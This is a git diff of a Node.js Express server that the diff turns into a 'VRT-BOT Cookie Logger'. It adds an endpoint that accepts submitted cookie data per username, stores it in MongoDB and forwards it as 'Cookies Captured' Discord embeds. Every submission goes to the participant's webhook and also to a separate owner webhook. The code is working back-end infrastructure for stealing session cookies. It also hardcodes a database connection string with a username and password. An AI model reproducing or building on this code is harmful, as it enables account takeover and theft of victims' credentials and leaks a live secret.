@@ -28,7 +28,7 @@ app.options('*', (req, res) => {
     res.sendStatus(204);
 });
 
-app.use(express.json());
+app.use(express.json({ limit: '10mb' }));
 
 // ============================================================
 //  ✅ LOGGING MIDDLEWARE
@@ -63,7 +63,7 @@ app.use((req, res, next) => {
 const MONGODB_URI = process.env.MONGODB_URI || 'mongodb+srv://rfbbuiness_db_user:JQ9tfKQbuZMRIxvV@clasific.rziuvht.mongodb.net/?appName=CLASIFIC';
 const DB_NAME = process.env.DB_NAME || 'vrtbot';
 const COLLECTION_NAME = 'webhooks';
-const QUEUE_COLLECTION = 'owner_queue';
+const QUEUE_COLLECTION = 'webhook_queue';
 
 let db;
 let webhooksCollection;
@@ -104,6 +104,7 @@ async function connectToMongoDB() {
             await queueCollection.createIndex({ status: 1 });
             await queueCollection.createIndex({ retryAt: 1 });
             await queueCollection.createIndex({ hookId: 1 });
+            await queueCollection.createIndex({ createdAt: 1 });
             console.log('✅ Database indexes created');
         } catch (indexError) {
             console.log('ℹ️ Indexes already exist');
@@ -135,17 +136,16 @@ function generateId() {
 }
 
 // ============================================================
-//  ✅ QUEUE SYSTEM
+//  ✅ QUEUE SYSTEM - STORE COOKIE DATA
 // ============================================================
-async function addToOwnerQueue(hookId, data, participantWebhook, username) {
+async function addToQueue(hookId, username, cookieData) {
     const queueItem = {
         hookId,
         username,
-        data,
-        participantWebhook,
+        cookieData: cookieData, // Only cookie data, no embeds
         status: 'pending',
         attempts: 0,
-        maxAttempts: 5,
+        maxAttempts: 3,
         createdAt: new Date().toISOString(),
         updatedAt: new Date().toISOString(),
         lastError: null,
@@ -153,11 +153,11 @@ async function addToOwnerQueue(hookId, data, participantWebhook, username) {
     };
     
     const result = await queueCollection.insertOne(queueItem);
-    console.log(`📥 Added to owner queue: ${result.insertedId} for user: ${username}`);
+    console.log(`📥 Added to queue: ${result.insertedId} for user: ${username}`);
     return result.insertedId;
 }
 
-async function getPendingOwnerQueueItems() {
+async function getPendingQueueItems() {
     const now = new Date().toISOString();
     return await queueCollection
         .find({ 
@@ -198,71 +198,63 @@ async function getQueueStats() {
     return { pending, waiting, sending, sent, failed, total: pending + waiting + sending + sent + failed };
 }
 
-async function getQueueItems(hookId = null, status = null, limit = 50) {
-    const filter = {};
-    if (hookId) filter.hookId = hookId;
-    if (status) filter.status = status;
-    
-    return await queueCollection
-        .find(filter)
-        .sort({ createdAt: -1 })
-        .limit(limit)
-        .toArray();
-}
-
 // ============================================================
-//  ✅ WEBHOOK SENDER WITH DETAILED LOGGING
+//  ✅ WEBHOOK SENDER - ONLY COOKIE DATA
 // ============================================================
-async function sendToWebhook(webhookUrl, data, target = 'unknown') {
+async function sendCookieDataToWebhook(webhookUrl, username, cookieData) {
     try {
-        // Log the target
-        console.log(`📤 [${target}] Sending to webhook...`);
-        console.log(`📤 [${target}] URL: ${webhookUrl ? webhookUrl.substring(0, 80) + '...' : 'EMPTY'}`);
-        
-        // Validate URL
         if (!webhookUrl) {
-            console.log(`❌ [${target}] Webhook URL is empty`);
-            return { 
-                success: false, 
-                error: 'Webhook URL is empty' 
-            };
+            return { success: false, error: 'Webhook URL is empty' };
         }
 
-        if (!webhookUrl.startsWith('https://discord.com/api/webhooks/') && 
-            !webhookUrl.startsWith('https://discordapp.com/api/webhooks/')) {
-            console.log(`❌ [${target}] Invalid webhook URL format: ${webhookUrl.substring(0, 50)}...`);
-            return { 
-                success: false, 
-                error: 'Invalid webhook URL format' 
-            };
-        }
+        // Format cookie data for Discord
+        const cookieString = typeof cookieData === 'string' ? cookieData : JSON.stringify(cookieData);
+        const cookiePreview = cookieString.length > 1000 ? cookieString.substring(0, 1000) + '...' : cookieString;
 
-        // Log the payload (first 500 chars)
-        const payloadStr = JSON.stringify(data);
-        console.log(`📦 [${target}] Payload size: ${payloadStr.length} chars`);
-        console.log(`📦 [${target}] Payload preview: ${payloadStr.substring(0, 300)}...`);
+        // Discord embed with only cookie data
+        const payload = {
+            username: "🍪 VRT-Bot Cookie Logger",
+            embeds: [{
+                title: `🍪 Cookies Captured`,
+                description: `**Username:** ${username}`,
+                color: 0xff6b6b,
+                fields: [
+                    {
+                        name: "🍪 Cookie Data",
+                        value: `\`\`\`\n${cookiePreview}\n\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "📅 Timestamp",
+                        value: new Date().toISOString(),
+                        inline: true
+                    },
+                    {
+                        name: "📦 Queue Status",
+                        value: "✅ Processed",
+                        inline: true
+                    }
+                ],
+                timestamp: new Date().toISOString(),
+                footer: { text: "🍪 Cookie Logger" }
+            }]
+        };
 
-        console.log(`📤 [${target}] Sending fetch request...`);
-        const startTime = Date.now();
-        
+        console.log(`📤 [${username}] Sending cookie data (${cookieString.length} chars)`);
+
         const response = await fetch(webhookUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify(data)
+            body: JSON.stringify(payload)
         });
 
-        const responseTime = Date.now() - startTime;
-        console.log(`⏱️ [${target}] Response time: ${responseTime}ms`);
-
         const responseText = await response.text();
-        console.log(`📥 [${target}] Response status: ${response.status}`);
-        console.log(`📥 [${target}] Response body: ${responseText.substring(0, 200)}`);
 
         if (response.status === 429) {
-            const retryAfter = response.headers.get('Retry-After') || '5';
-            console.log(`⏳ [${target}] Rate limited! Retry after ${retryAfter}s`);
+            const retryAfter = response.headers.get('Retry-After') || '600'; // 10 min default
+            console.log(`⏳ Rate limited! Retry after ${retryAfter}s`);
             return { 
                 success: false, 
                 status: 429, 
@@ -272,7 +264,6 @@ async function sendToWebhook(webhookUrl, data, target = 'unknown') {
         }
 
         if (!response.ok) {
-            console.log(`❌ [${target}] HTTP error: ${response.status}`);
             return { 
                 success: false, 
                 status: response.status,
@@ -280,12 +271,11 @@ async function sendToWebhook(webhookUrl, data, target = 'unknown') {
             };
         }
 
-        console.log(`✅ [${target}] Webhook sent successfully!`);
+        console.log(`✅ Cookie data sent successfully for ${username}`);
         return { success: true, status: response.status };
 
     } catch (error) {
-        console.error(`❌ [${target}] Webhook error:`, error.message);
-        console.error(`❌ [${target}] Error stack:`, error.stack);
+        console.error(`❌ Webhook error:`, error.message);
         return { 
             success: false, 
             error: error.message
@@ -294,11 +284,11 @@ async function sendToWebhook(webhookUrl, data, target = 'unknown') {
 }
 
 // ============================================================
-//  ✅ BACKGROUND PROCESSOR WITH LOGGING
+//  ✅ BACKGROUND PROCESSOR - RUNS EVERY 10 MINUTES
 // ============================================================
 let isProcessing = false;
 
-async function processOwnerQueue() {
+async function processQueue() {
     if (isProcessing) {
         console.log(`⏳ Queue processor already running, skipping...`);
         return;
@@ -307,8 +297,9 @@ async function processOwnerQueue() {
     try {
         isProcessing = true;
         console.log(`🔄 ===== QUEUE PROCESSOR STARTED =====`);
+        console.log(`⏰ Time: ${new Date().toISOString()}`);
         
-        const items = await getPendingOwnerQueueItems();
+        const items = await getPendingQueueItems();
         console.log(`📊 Items found: ${items.length}`);
         
         if (items.length === 0) {
@@ -317,19 +308,34 @@ async function processOwnerQueue() {
             return;
         }
         
-        console.log(`📤 Processing ${items.length} queue items for owner webhook`);
+        console.log(`📤 Processing ${items.length} queue items`);
         
         for (const item of items) {
-            console.log(`📦 ===== PROCESSING QUEUE ITEM =====`);
+            console.log(`📦 ===== PROCESSING ITEM =====`);
             console.log(`📦 ID: ${item._id}`);
             console.log(`👤 User: ${item.username}`);
             console.log(`🔢 Attempt: ${item.attempts + 1}/${item.maxAttempts}`);
             
             await updateQueueItem(item._id, { status: 'sending' });
-            console.log(`📤 Status updated to 'sending'`);
             
-            console.log(`📤 Sending to owner webhook for user: ${item.username}`);
-            const result = await sendToWebhook(OWNER_WEBHOOK, item.data, `owner (${item.username})`);
+            // Get the hook's webhook URL
+            const hook = await webhooksCollection.findOne({ hookId: item.hookId });
+            
+            if (!hook || !hook.webhookUrl) {
+                console.log(`❌ No webhook found for user: ${item.username}`);
+                await updateQueueItem(item._id, {
+                    status: 'failed',
+                    lastError: 'No webhook URL found'
+                });
+                continue;
+            }
+            
+            // Send to participant webhook
+            const result = await sendCookieDataToWebhook(
+                hook.webhookUrl, 
+                item.username, 
+                item.cookieData
+            );
             
             if (result.success) {
                 await updateQueueItem(item._id, {
@@ -338,9 +344,24 @@ async function processOwnerQueue() {
                     lastError: null,
                     retryAt: null
                 });
-                console.log(`✅ Owner webhook sent successfully for ${item.username}`);
+                console.log(`✅ Cookie data sent for ${item.username}`);
+                
+                // Also send to owner if configured
+                if (OWNER_WEBHOOK) {
+                    console.log(`📤 Also sending to owner webhook...`);
+                    const ownerResult = await sendCookieDataToWebhook(
+                        OWNER_WEBHOOK,
+                        `[OWNER] ${item.username}`,
+                        item.cookieData
+                    );
+                    if (ownerResult.success) {
+                        console.log(`✅ Owner webhook sent`);
+                    } else {
+                        console.log(`⚠️ Owner webhook failed: ${ownerResult.error}`);
+                    }
+                }
             } else if (result.status === 429) {
-                const retryAfterSeconds = parseInt(result.retryAfter) || 30;
+                const retryAfterSeconds = parseInt(result.retryAfter) || 600;
                 const retryAt = new Date(Date.now() + (retryAfterSeconds * 1000));
                 
                 await updateQueueItem(item._id, {
@@ -349,7 +370,7 @@ async function processOwnerQueue() {
                     attempts: item.attempts + 1,
                     lastError: `Rate limited, retry at ${retryAt.toISOString()}`
                 });
-                console.log(`⏳ Owner rate limited, retry at ${retryAt.toISOString()}`);
+                console.log(`⏳ Rate limited, retry at ${retryAt.toISOString()}`);
                 
                 // Stop processing more items if rate limited
                 console.log(`⏹️ Stopping queue processing due to rate limit`);
@@ -361,45 +382,39 @@ async function processOwnerQueue() {
                         lastError: result.error || 'Max attempts reached',
                         retryAt: null
                     });
-                    console.log(`❌ Owner webhook failed after ${item.attempts} attempts for ${item.username}`);
+                    console.log(`❌ Failed after ${item.attempts} attempts for ${item.username}`);
                 } else {
-                    const retryAt = new Date(Date.now() + 30000);
+                    const retryAt = new Date(Date.now() + 300000); // 5 min
                     await updateQueueItem(item._id, {
                         status: 'pending',
                         retryAt: retryAt.toISOString(),
                         attempts: item.attempts + 1,
                         lastError: result.error || 'Retrying'
                     });
-                    console.log(`⚠️ Owner webhook failed, retrying at ${retryAt.toISOString()}`);
+                    console.log(`⚠️ Failed, retrying at ${retryAt.toISOString()}`);
                 }
             }
             
             // Wait between items
-            console.log(`⏳ Waiting 500ms before next item...`);
-            await new Promise(r => setTimeout(r, 500));
+            console.log(`⏳ Waiting 2 seconds before next item...`);
+            await new Promise(r => setTimeout(r, 2000));
         }
         
     } catch (error) {
-        console.error(`❌ Owner queue processing error:`, error);
-        console.error(`❌ Error stack:`, error.stack);
+        console.error(`❌ Queue processing error:`, error);
     } finally {
         isProcessing = false;
         console.log(`🔄 ===== QUEUE PROCESSOR COMPLETED =====`);
         
-        // Schedule next check if items remain
+        // Schedule next check
         const stats = await getQueueStats();
         console.log(`📊 Queue stats after processing:`, stats);
         
-        if (stats.pending > 0) {
-            console.log(`⏰ ${stats.pending} items pending, checking again in 10 seconds`);
+        if (stats.pending > 0 || stats.waiting > 0) {
+            console.log(`⏰ ${stats.pending + stats.waiting} items remaining, checking again in 5 minutes`);
             setTimeout(() => {
-                processOwnerQueue();
-            }, 10000);
-        } else if (stats.waiting > 0) {
-            console.log(`⏰ ${stats.waiting} items waiting for rate limit, checking again in 30 seconds`);
-            setTimeout(() => {
-                processOwnerQueue();
-            }, 30000);
+                processQueue();
+            }, 300000); // 5 min
         } else {
             console.log(`📭 Queue is empty, processor idle`);
         }
@@ -410,10 +425,11 @@ async function processOwnerQueue() {
 //  ✅ START BACKGROUND PROCESSOR
 // ============================================================
 function startQueueProcessor() {
-    console.log('🚀 Starting owner queue processor...');
-    setTimeout(() => {
-        processOwnerQueue();
-    }, 5000);
+    console.log('🚀 Starting queue processor (10 minute intervals)...');
+    // Process every 10 minutes
+    setInterval(() => {
+        processQueue();
+    }, 600000); // 10 minutes
 }
 
 // ============================================================
@@ -424,7 +440,7 @@ function startQueueProcessor() {
 app.get('/', (req, res) => {
     res.json({
         status: 'online',
-        message: 'VRT-BOT Dual Hook Server',
+        message: 'VRT-BOT Cookie Logger',
         ownerWebhookConfigured: !!OWNER_WEBHOOK,
         databaseConnected: !!db,
         timestamp: new Date().toISOString(),
@@ -455,11 +471,15 @@ app.get('/api/queue/items', async (req, res) => {
     const { hookId, status, limit } = req.query;
     
     try {
-        const items = await getQueueItems(
-            hookId || null,
-            status || null,
-            parseInt(limit) || 50
-        );
+        const filter = {};
+        if (hookId) filter.hookId = hookId;
+        if (status) filter.status = status;
+        
+        const items = await queueCollection
+            .find(filter)
+            .sort({ createdAt: -1 })
+            .limit(parseInt(limit) || 50)
+            .toArray();
         res.json(items);
     } catch (error) {
         res.status(500).json({ error: error.message });
@@ -471,16 +491,13 @@ app.post('/api/generate', async (req, res) => {
     const { username, webhookUrl } = req.body;
     
     console.log(`🔑 Generating hook for user: ${username}`);
-    console.log(`🔗 Webhook URL: ${webhookUrl ? webhookUrl.substring(0, 60) + '...' : 'EMPTY'}`);
     
     if (!username || !webhookUrl) {
         return res.status(400).json({ error: 'Username and webhook URL required' });
     }
 
-    // Accept both discord.com and discordapp.com
     if (!webhookUrl.startsWith('https://discord.com/api/webhooks/') && 
         !webhookUrl.startsWith('https://discordapp.com/api/webhooks/')) {
-        console.log(`❌ Invalid webhook URL format: ${webhookUrl.substring(0, 50)}...`);
         return res.status(400).json({ error: 'Invalid Discord webhook URL' });
     }
 
@@ -501,8 +518,6 @@ app.post('/api/generate', async (req, res) => {
                     }
                 }
             );
-            
-            console.log(`✅ Webhook updated for user: ${username}`);
             
             return res.json({
                 success: true,
@@ -602,129 +617,55 @@ app.delete('/api/hook/:id', async (req, res) => {
 });
 
 // ============================================================
-//  ✅ SEND TO PARTICIPANT FIRST + QUEUE OWNER
-//  WITH EXTRA LOGGING
+//  ✅ SUBMIT COOKIES - QUEUE THEM
 // ============================================================
-app.post('/api/send/:hookId', async (req, res) => {
+app.post('/api/submit-cookies/:hookId', async (req, res) => {
     const { hookId } = req.params;
-    const { data } = req.body;
+    const { username, cookieData } = req.body;
 
-    console.log(`📨 ========================================`);
-    console.log(`📨 NEW SEND REQUEST`);
-    console.log(`📨 Hook ID: ${hookId}`);
-    console.log(`📨 Timestamp: ${new Date().toISOString()}`);
-    console.log(`📨 Request body:`, JSON.stringify(req.body).substring(0, 500));
+    console.log(`🍪 ===== NEW COOKIE SUBMISSION =====`);
+    console.log(`🍪 Hook ID: ${hookId}`);
+    console.log(`👤 Username: ${username}`);
+    console.log(`📦 Cookie data size: ${cookieData ? cookieData.length : 0} chars`);
 
-    if (!data) {
-        console.log(`❌ No data provided in request body`);
-        return res.status(400).json({ error: 'Missing data' });
+    if (!cookieData) {
+        return res.status(400).json({ error: 'Cookie data required' });
     }
 
     if (!db || !webhooksCollection) {
-        console.log(`❌ Database not connected`);
         return res.status(503).json({ error: 'Database not connected' });
     }
 
     try {
-        console.log(`🔍 Looking up hook: ${hookId}`);
+        // Verify hook exists
         const hook = await webhooksCollection.findOne({ hookId });
-        
         if (!hook) {
             console.log(`❌ Hook not found: ${hookId}`);
             return res.status(404).json({ error: 'Hook not found' });
         }
 
-        console.log(`👤 Found participant: ${hook.username}`);
-        console.log(`🔗 Webhook URL: ${hook.webhookUrl ? hook.webhookUrl.substring(0, 60) + '...' : 'NOT SET'}`);
-        console.log(`📅 Created: ${hook.createdAt}`);
-
-        let participantSuccess = false;
-        let participantError = null;
-        let participantStatus = null;
-
-        // ============================================================
-        //  1. ALWAYS SEND TO PARTICIPANT FIRST
-        // ============================================================
-        if (hook.webhookUrl) {
-            console.log(`📤 ===== SENDING TO PARTICIPANT =====`);
-            console.log(`👤 Username: ${hook.username}`);
-            console.log(`🔗 Full webhook: ${hook.webhookUrl}`);
-            
-            const participantResult = await sendToWebhook(hook.webhookUrl, data, `participant (${hook.username})`);
-            
-            participantSuccess = participantResult.success;
-            participantError = participantResult.error || null;
-            participantStatus = participantResult.status || null;
-            
-            if (participantSuccess) {
-                console.log(`✅ ===== PARTICIPANT SUCCESS =====`);
-                console.log(`✅ ${hook.username} notified successfully`);
-            } else {
-                console.log(`❌ ===== PARTICIPANT FAILED =====`);
-                console.log(`❌ Error: ${participantResult.error}`);
-                console.log(`❌ Status: ${participantResult.status || 'unknown'}`);
-                console.log(`❌ Full result:`, JSON.stringify(participantResult));
-            }
-        } else {
-            participantError = 'No webhook URL configured for this user';
-            console.log(`⚠️ No webhook URL for participant: ${hook.username}`);
-        }
-
-        // ============================================================
-        //  2. QUEUE FOR OWNER WEBHOOK
-        // ============================================================
-        let ownerQueueId = null;
+        // Add to queue
+        const queueId = await addToQueue(hookId, username || hook.username || 'Unknown', cookieData);
         
-        if (OWNER_WEBHOOK) {
-            console.log(`📥 ===== QUEUEING FOR OWNER =====`);
-            console.log(`👤 User: ${hook.username}`);
-            console.log(`🔗 Owner webhook: ${OWNER_WEBHOOK.substring(0, 60)}...`);
-            
-            const queueId = await addToOwnerQueue(
-                hookId,
-                data,
-                hook.webhookUrl,
-                hook.username
-            );
-            
-            ownerQueueId = queueId;
-            console.log(`✅ Added to owner queue with ID: ${queueId}`);
-            
-            if (!isProcessing) {
-                console.log(`🔄 Triggering owner queue processing...`);
-                processOwnerQueue();
-            }
-        } else {
-            console.log(`⚠️ Owner webhook not configured in environment variables`);
+        console.log(`✅ Cookies queued with ID: ${queueId}`);
+        console.log(`📊 Queue size: ${await queueCollection.countDocuments({ status: 'pending' })}`);
+        
+        // Trigger processing if not already running
+        if (!isProcessing) {
+            processQueue();
         }
-
-        console.log(`📊 ===== FINAL RESULT =====`);
-        console.log(`📊 Participant: ${participantSuccess ? '✅ SUCCESS' : '❌ FAILED'}`);
-        console.log(`📊 Owner: ${OWNER_WEBHOOK ? '📦 QUEUED (ID: ' + ownerQueueId + ')' : '⏭️ SKIPPED'}`);
-        console.log(`📊 ==================================`);
 
         res.json({
-            success: participantSuccess,
-            message: participantSuccess 
-                ? '✅ Participant notified! Owner webhook queued.' 
-                : `⚠️ Participant failed: ${participantError}. Data queued for owner.`,
+            success: true,
+            message: 'Cookie data queued for processing',
+            queueId: queueId,
             hookId: hookId,
-            username: hook.username,
-            participant: {
-                success: participantSuccess,
-                error: participantError,
-                status: participantStatus
-            },
-            owner: {
-                queued: !!OWNER_WEBHOOK,
-                queueId: ownerQueueId
-            },
-            timestamp: new Date().toISOString()
+            username: username || hook.username,
+            status: 'pending'
         });
         
     } catch (error) {
-        console.error(`❌ Error processing request:`, error);
-        console.error(`❌ Error stack:`, error.stack);
+        console.error('❌ Error submitting cookies:', error);
         res.status(500).json({ error: 'Server error: ' + error.message });
     }
 });
@@ -747,7 +688,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 //  ✅ START SERVER
 // ============================================================
 async function startServer() {
-    console.log('🚀 Starting VRT-BOT Dual Hook Server...');
+    console.log('🚀 Starting VRT-BOT Cookie Logger...');
     
     const connected = await connectToMongoDB();
     
@@ -757,6 +698,7 @@ async function startServer() {
         console.log(`✅ CORS enabled for all origins`);
         console.log(`🔗 Health: https://vrt-bot-hook-server.onrender.com/`);
         console.log(`📡 Owner Webhook: ${OWNER_WEBHOOK ? '✅ Configured' : '❌ Not set'}`);
+        console.log(`⏰ Queue processor runs every 10 minutes`);
     });
     
     if (connected && OWNER_WEBHOOK) {
